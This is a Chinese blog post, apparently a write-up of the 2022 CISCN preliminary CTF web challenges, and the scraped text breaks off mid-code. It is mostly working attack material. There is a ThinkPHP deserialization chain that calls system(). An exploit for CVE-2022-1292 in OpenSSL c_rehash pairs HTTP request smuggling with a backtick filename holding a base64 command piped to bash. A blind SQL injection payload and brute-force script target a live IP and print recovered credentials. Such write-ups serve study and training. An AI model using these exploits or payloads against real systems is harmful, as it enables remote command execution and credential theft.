{"blogid": "125598409", "writerAge": "码龄2年", "writerBlogNum": "107", "writerCollect": "227", "writerComment": "16", "writerFan": "177", "writerGrade": "4级", "writerIntegral": "1403", "writerName": "Snakin_ya", "writerProfileAdress": "writer_image\\profile_125598409.jpg", "writerRankTotal": "20854", "writerRankWeekly": "41457", "writerThumb": "306", "writerVisitNum": "131312", "blog_read_count": "1296", "blog_time": "于 2022-07-04 13:42:48 发布", "blog_title": "[2022 CISCN]初赛 web题目复现", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"ezpop_0\"></a>ezpop</h2>\n<p>源码泄露www.zip，用网上的链子直接打</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model<span class=\"token punctuation\">\\</span>concern</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">trait</span> <span class=\"token class-name-definition class-name\">Attribute</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"key\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"key1\"</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string double-quoted-string\">\"cat /flag.txt\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$withAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"key\"</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"key1\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$json</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"key\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Model</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">use</span> <span class=\"token package\">model<span class=\"token punctuation\">\\</span>concern<span class=\"token punctuation\">\\</span>Attribute</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$lazySave</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$withEvent</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$exists</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$force</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$table</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$jsonAssoc</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">lazySave</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">withEvent</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">force</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">table</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">jsonAssoc</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>model</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">use</span> <span class=\"token package\">think<span class=\"token punctuation\">\\</span>Model</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Pivot</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Model</span>\n<span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Pivot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"online_crt_50\"></a>online_crt</h2>\n<p>考点：</p>\n<p>CVE-2022-1292</p>\n<p>SSRF</p>\n<h3><a id=\"_58\"></a>项目分析</h3>\n<p>项目后端为python+go，其中python部署在外网，go通过python转发到内网</p>\n<p>先看python，一共有四个路由：</p>\n<ul><li> <p><code>/</code>为主界面</p> </li><li> <p><code>/getcrt</code>生成一个x509证书</p> </li><li> <p><code>/createlink</code>调用c_rehash创建证书链接</p> </li><li> <p><code>/proxy</code>通过代理访问go内网服务</p> </li></ul>\n<p><img alt=\"image-20220702135500941\" src=\"image\\bb6fd61799ce28517e113f814366a98e.png\"/></p>\n<p>再来看go，有一个admin路由，用以重命名证书文件</p>\n<p><img alt=\"image-20220702135633631\" src=\"image\\10bbba4c0decbe1db4d25d6c0b65ad8f.png\"/></p>\n<h3><a id=\"_76\"></a>解题</h3>\n<p>题目的考点为CVE-2022-1292，是c_rehash的一个命令注入漏洞</p>\n<p>c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接</p>\n<p>我们看到漏洞的commit：</p>\n<p>https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8?diff=split</p>\n<p><img alt=\"image-20220702142413801\" src=\"image\\7c152b66854d2189b55b5b06dddd4472.png\"/></p>\n<p>这里没有过滤反引号就直接将文件名拼接到了命令中，那么我们在文件名中添加反引号即可执行任意命令</p>\n<p>向上追溯可以发现：</p>\n<p><img alt=\"image-20220702143311371\" src=\"image\\2dac9d4b3d4afc5ef18c3cb122d24ac3.png\"/></p>\n<p>在执行命令前函数会检查文件后缀名<code>.(pem)|(crt)|(cer)|(crl) </code>和文件内容<br/> 文件内容必须包含证书或者是吊销列表才能通过检查</p>\n<h4><a id=\"_97\"></a>漏洞利用条件</h4>\n<ul><li>执行<code>c_rehash</code>的目标目录文件可控</li><li>文件后缀符合要求</li><li>文件内容必须包含证书或者吊销列表</li><li>文件名可控</li></ul>\n<p>题目中生成证书功能可以创建一个满足要求的文件，那么我们还需要对文件名进行修改</p>\n<p>看到内网go部分：</p>\n<p>为了实现可控的文件名，我们需要调用go的重命名功能，go的路由在重命名前有两个校验<code>c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\"</code></p>\n<p>我们需要绕过这两个验证</p>\n<h4><a id=\"urlhttp_112\"></a>url注入http头</h4>\n<p><code>Request.Host</code>为请求的host头，在python中请求包中host头是固定的(test_host_api)，这里我们需要想办法让go后端认为host值为admin</p>\n<p>python在代理请求时直接使用了socket发送raw数据包，在数据包{uri}处没有过滤，所以我们可以在uri注入一个host头来替换原本的头，注入之后数据包变成：</p>\n<pre><code class=\"prism language-perl\">GET <span class=\"token operator\">/</span> HTTP <span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> admin\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Guest\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span>CN<span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span><span class=\"token string\">q=0.9\nConnection: close\n\n\nHTTP /1.1\nHost: test_api_host\nUser-Agent: Guest\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=</span><span class=\"token number\">0.9</span>\nConnection<span class=\"token punctuation\">:</span> close\n</code></pre>\n<p>这样就可以绕过host头检验</p>\n<h4><a id=\"goRawPath_137\"></a>go的RawPath特性</h4>\n<p>对于<code>Request.URL.RawPath</code>检验，我们通过阅读go net库的源码，发现go语言中会对原始url进行解码(反转义)，如果解码后再编码的url和原始url不同，那么RawPath会被设置为原始url，反之会被设置为空</p>\n<p><img alt=\"image-20220703234004573\" src=\"image\\c5e317d6b74298c9a08eb60ccfc381d9.png\"/></p>\n<p>也就是说为了避免RawPath被置空，我们只需将url中任意一个<code>/</code>进行url编码即可</p>\n<h4><a id=\"_145\"></a>整体流程</h4>\n<ul><li> <p>访问 /getcrt 路由 生成一个证书 返回证书路径</p> <pre><code>static/crt/62a5726a-352a-4538-b236-1972b59ccf1e.crt\n</code></pre> <p><img alt=\"image-20220703234732211\" src=\"image\\86f83addd57ec65ed4f661c5a018ece1.png\"/></p> </li><li> <p>请求 /proxy 修改证书名为恶意文件名</p> <p>这一步需要构造HTTP包注入多个HTTP连接来改HOST并且URL里面有个/要改成%2f绕过检查访问重命名接口</p> <p>利用CVE构造命令注入Payloadm，发包改名</p> <pre><code>`echo \"Y2F0IC9mbGFnID4gZmxhZw==\" | base64 -d | bash`.crt\n</code></pre> <p>发包：</p> <pre><code class=\"prism language-perl\">GET <span class=\"token operator\">/</span>proxy HTTP<span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token v-string string\">1.14.71.254</span><span class=\"token punctuation\">:</span><span class=\"token number\">28536</span>\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows NT <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">;</span> rv<span class=\"token punctuation\">:</span><span class=\"token number\">102.0</span><span class=\"token punctuation\">)</span> Gecko<span class=\"token operator\">/</span><span class=\"token number\">20100101</span> Firefox<span class=\"token operator\">/</span><span class=\"token number\">102.0</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token regex\">/xhtml+xml,application/xml</span><span class=\"token punctuation\">;</span><span class=\"token string\">q=0.9,image/avif,image/webp,*/*;q=</span><span class=\"token number\">0.8</span>\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span>CN<span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span><span class=\"token string\">q=0.8,zh-TW;q=</span><span class=\"token number\">0.7</span><span class=\"token punctuation\">,</span>zh<span class=\"token operator\">-</span>HK<span class=\"token punctuation\">;</span><span class=\"token string\">q=0.5,en-US;q=</span><span class=\"token number\">0.3</span><span class=\"token punctuation\">,</span>en<span class=\"token punctuation\">;</span><span class=\"token string\">q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundary5FhbXcy21j5NxtoY\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">478</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundary5FhbXcy21j5NxtoY\nContent<span class=\"token operator\">-</span>Disposition<span class=\"token punctuation\">:</span> form<span class=\"token operator\">-</span>data<span class=\"token punctuation\">;</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"uri\"</span>\n\n<span class=\"token operator\">/</span> HTTP<span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> admin\nConnection<span class=\"token punctuation\">:</span> keep<span class=\"token operator\">-</span>alive\n\nGET <span class=\"token operator\">/</span>admin<span class=\"token variable\">%2</span>frename<span class=\"token operator\">?</span>oldname<span class=\"token operator\">=</span>62a5726a<span class=\"token operator\">-</span>352a<span class=\"token operator\">-</span><span class=\"token number\">4538</span><span class=\"token operator\">-</span>b236<span class=\"token operator\">-</span>1972b59ccf1e<span class=\"token operator\">.</span>crt<span class=\"token variable\">&amp;newname</span><span class=\"token operator\">=</span><span class=\"token variable\">%60</span><span class=\"token variable\">%65</span><span class=\"token variable\">%63</span><span class=\"token variable\">%68</span><span class=\"token variable\">%6</span>f<span class=\"token variable\">%20</span><span class=\"token variable\">%22</span><span class=\"token variable\">%59</span><span class=\"token variable\">%32</span><span class=\"token variable\">%46</span><span class=\"token variable\">%30</span><span class=\"token variable\">%49</span><span class=\"token variable\">%43</span><span class=\"token variable\">%39</span><span class=\"token variable\">%6</span>d<span class=\"token variable\">%62</span><span class=\"token variable\">%47</span><span class=\"token variable\">%46</span><span class=\"token variable\">%6</span>e<span class=\"token variable\">%49</span><span class=\"token variable\">%44</span><span class=\"token variable\">%34</span><span class=\"token variable\">%67</span><span class=\"token variable\">%5</span>a<span class=\"token variable\">%6</span>d<span class=\"token variable\">%78</span><span class=\"token variable\">%68</span><span class=\"token variable\">%5</span>a<span class=\"token variable\">%77</span><span class=\"token variable\">%3</span>d<span class=\"token variable\">%3</span>d<span class=\"token variable\">%22</span><span class=\"token variable\">%20</span><span class=\"token variable\">%7</span>c<span class=\"token variable\">%20</span><span class=\"token variable\">%62</span><span class=\"token variable\">%61</span><span class=\"token variable\">%73</span><span class=\"token variable\">%65</span><span class=\"token variable\">%36</span><span class=\"token variable\">%34</span><span class=\"token variable\">%20</span><span class=\"token variable\">%2</span>d<span class=\"token variable\">%64</span><span class=\"token variable\">%20</span><span class=\"token variable\">%7</span>c<span class=\"token variable\">%20</span><span class=\"token variable\">%62</span><span class=\"token variable\">%61</span><span class=\"token variable\">%73</span><span class=\"token variable\">%68</span><span class=\"token variable\">%60</span><span class=\"token variable\">%2</span>e<span class=\"token variable\">%63</span><span class=\"token variable\">%72</span><span class=\"token variable\">%74</span> HTTP<span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> admin\nConnection<span class=\"token punctuation\">:</span> close\n\nGET <span class=\"token operator\">/</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundary5FhbXcy21j5NxtoY<span class=\"token operator\">--</span>\n</code></pre> <p><img alt=\"image-20220703235322616\" src=\"image\\7a17f4255094e0e897961785832edad0.png\"/></p> </li><li> <p>访问createlink接口，触发命令注入，将flag写入<code>static/crt/flag</code></p> <p><img alt=\"image-20220703235420028\" src=\"image\\017aaca013a800ccc9598a434c0a7787.png\"/></p> </li><li> <p>最后访问即可</p> </li></ul>\n<h2><a id=\"ezpentest_202\"></a>ezpentest</h2>\n<h3><a id=\"SQL_204\"></a>SQL注入</h3>\n<p>首先进入题目是一个登录框</p>\n<p><img alt=\"image-20220704001728428\" src=\"image\\ac442907e87741a186f701f886103ccf.png\"/></p>\n<p>题目给出了waf：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[\\s,()#;*~\\-]/'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^.*(?=union|binary|regexp|rlike).*$/i'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这一部分内容和虎符杯类似，我们构造payload</p>\n<pre><code class=\"prism language-mysql\">0'||case'1'when`password`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'\n</code></pre>\n<p>简单分析一下：</p>\n<ul><li> <p>利用like去正则匹配password这一列的数据，如果匹配到就返回<code>9223372036854775807+1</code> 这个表达式，而这个表示执行后会导致数据溢出，服务器会报500，否则就返回’0’，服务器会报error</p> </li><li> <p><code>+''</code>是因为过滤了空白符号，所以用来连接起sql语句的，这里的数据溢出同样可以用<code>18446744073709551615+1</code>，这个<code>18446744073709551615</code>的值其实就是<code>~0</code>，也就是说这个payload其实就是<code>~0+1</code></p> </li><li> <p><code>utf8mb4_bin</code>是用来区分大小写的，因为like正则匹配是不区分大小写的</p> </li><li> <p>case用来解决优先级问题</p> </li></ul>\n<p>所以构造脚本：</p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> string\npayload<span class=\"token operator\">=</span><span class=\"token string\">\"0'||case'1'when`username`collate'utf8mb4_bin'like'{}%'then+9223372036854775807+1+''else'0'end||'\"</span>\n<span class=\"token comment\">#这里过滤了取反，所以要用9223372036854775807+1这个也可以18446744073709551615+1来代替溢出</span>\n<span class=\"token builtin\">list</span> <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> <span class=\"token string\">'^$!_%@&amp;'</span>\n\nproxies<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token string\">'http'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'http://127.0.0.1:8080'</span>\n<span class=\"token punctuation\">}</span>\t<span class=\"token comment\">#这里是可以通过走代理来看下自己打进去的payload有没有啥问题。</span>\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://1.14.71.254:28706/login.php'</span>\nj<span class=\"token operator\">=</span><span class=\"token string\">''</span>\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token keyword\">in</span> <span class=\"token string\">'%_'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#这里是对like正则匹配中的一些特殊符号进行转义，这里很重要，不然注出来的结果都不行。</span>\n            i <span class=\"token operator\">=</span> <span class=\"token string\">\"\\\\\"</span> <span class=\"token operator\">+</span> i\n        now_payload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>\n        date<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> now_payload<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'aaa'</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>now_payload<span class=\"token punctuation\">)</span>\n        re <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>date<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span>  re<span class=\"token punctuation\">.</span>status_code<span class=\"token operator\">==</span><span class=\"token number\">500</span><span class=\"token punctuation\">:</span>\n\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ok\"</span><span class=\"token punctuation\">)</span>\n            j<span class=\"token operator\">+=</span>i\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n\n<span class=\"token comment\"># 最后得到的账号密码</span>\n<span class=\"token comment\"># nssctfwabbybaboo!@$%!!</span>\n<span class=\"token comment\"># PAssw40d_Y0u3_Never_Konwn!@!!</span>\n</code></pre>\n<h3><a id=\"_276\"></a>解混淆</h3>\n<p>登陆后发现混淆代码，提示有一个<code>1Nd3x_Y0u_N3v3R_Kn0W.php</code></p>\n<p><img alt=\"image-20220704120233347\" src=\"image\\3d4879788f3e7b12a9539e8fdb14ee41.png\"/></p>\n<p>直接访问得到<code>SomeClass.php</code>的内容</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">see</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$checker</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReflectionClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_class</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$checker</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getFileName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token string single-quoted-string\">'SomeClass.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">B</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">see</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"lock lock read!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">D</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">b</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">learn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">E</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token 